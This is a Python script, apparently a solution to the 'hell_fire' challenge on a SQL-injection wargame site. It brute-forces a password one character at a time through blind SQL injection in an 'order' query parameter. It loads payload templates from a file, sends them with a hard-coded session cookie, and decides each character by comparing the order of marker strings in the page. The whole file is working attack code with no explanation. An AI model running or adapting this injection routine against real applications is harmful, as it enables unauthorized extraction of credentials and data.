import string
import requests
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php/"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=1mg3tdj3njma0epf82af1kr1d2"
}
f1 = open("order-by.txt", "r")

p = "order"

list=[]        
for ch in f1:                
    print(ch)
    list.append(ch)
user_ch = int(input("your choose : "))
sp1 = input("special 1 : ")
sp2 = input("special 2 : ")
len_pw = int(input("length :"))
password = ""
s_p = input("Sepecial params : ")

for i in range(1, len_pw):
    for j in char:
        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", j).replace("\n", "")
        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
        print(get.text.find(sp1) ,get.text.find(sp2) )
        print(len(get.text), pw[2:], get.url)
        if get.text.find(sp1) < get.text.find(sp2):
            print(len(get.text), pw[2:], get.url)
            password = password + j
            print(password)
            break    

f1.close()
